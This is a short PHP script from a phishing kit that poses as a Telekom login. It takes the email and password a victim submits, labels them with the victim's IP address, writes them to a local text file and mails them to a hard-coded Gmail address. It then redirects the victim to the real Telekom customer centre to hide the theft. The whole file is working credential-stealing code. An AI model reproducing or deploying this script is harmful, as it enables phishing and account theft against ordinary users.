<?

/*
// Brought to you by dcworld ******* icq: 716005439 
*/

$ip = getenv("REMOTE_ADDR");
$message .= "--------------T3l�c0m Info-----------------------\n";
$message .= "|Email : ".$_POST['hxbvhs_usr']."\n";
$message .= "|pa33 : ".$_POST['phshsh_pwzd']."\n";
 

 $message .= "-------------Vict!m Info-----------------------\n";
 
$message .= "IP: ".$ip."\n";


$recipient = "24wuliang24@gmail.com";
$subject = "T3l�c0m | ".$ip."\n";
$text = fopen('sgh.txt', 'a');
fwrite($text, $message);

mail($recipient,$subject,$message);
header("Location:  https://www.telekom.de/kundencenter/startseite");
?>

  